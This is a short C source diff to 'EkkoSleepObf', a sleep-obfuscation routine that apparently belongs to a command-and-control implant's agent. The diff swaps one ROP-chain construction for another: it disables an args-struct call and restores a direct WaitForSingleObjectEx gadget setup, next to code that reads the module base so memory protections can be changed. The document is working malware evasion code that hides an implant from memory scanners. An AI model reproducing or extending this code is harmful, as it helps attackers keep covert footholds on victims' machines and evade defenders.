@@ -101,6 +101,7 @@ BOOL EkkoSleepObf(
                         Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
                         Rop[i].Rsp -= sizeof(PVOID);
                     }
+                    /*
                     Args args;
                     args.Nargs = 3;
                     args.Arg01 = (UINT_PTR)EvntStart;
@@ -112,12 +113,13 @@ BOOL EkkoSleepObf(
                     Rop[Inc].Rcx = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                     Rop[Inc].Rdx = (UINT_PTR)&args;
                     Inc++;
+                    */
                     /* start rop chain with WaitForSingleObject. */
-                    //Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
-                    //Rop[Inc].Rcx = (UINT_PTR)EvntStart;
-                    //Rop[Inc].Rdx = (UINT_PTR)INFINITE;
-                    //Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
-                    //Inc++;
+                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
+                    Rop[Inc].Rcx = (UINT_PTR)EvntStart;
+                    Rop[Inc].Rdx = (UINT_PTR)INFINITE;
+                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
+                    Inc++;
 
                     /*Virtual protect*/
                     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)agent->ModuleBaseAddr;
